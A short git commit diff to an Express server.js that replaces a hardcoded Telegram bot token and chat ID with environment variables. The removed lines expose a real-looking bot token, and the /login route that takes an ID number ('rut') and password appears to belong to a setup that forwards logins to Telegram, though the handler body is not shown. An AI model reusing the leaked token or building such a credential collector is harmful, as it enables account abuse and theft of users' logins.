a6bcaab832364f53a208662e42aded593a15bf90
pcanalespp2101 <pcanalespp2101@gmail.com>
2026-02-02 17:04:35 -0300

    Update server.js

--- server.js
+++ server.js
@@ -6,8 +6,8 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // Aquí van tus credenciales de Telegram
-const TELEGRAM_TOKEN = "8278463397:AAGo2ZY5xthkffSKMPEd-69tIwz2sIXdQuE"; 
-const CHAT_ID = "7240166271"; 
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; 
+const CHAT_ID = process.env.CHAT_ID; 
 
 app.post("/login", async (req, res) => {
   const { rut, passwd } = req.body;
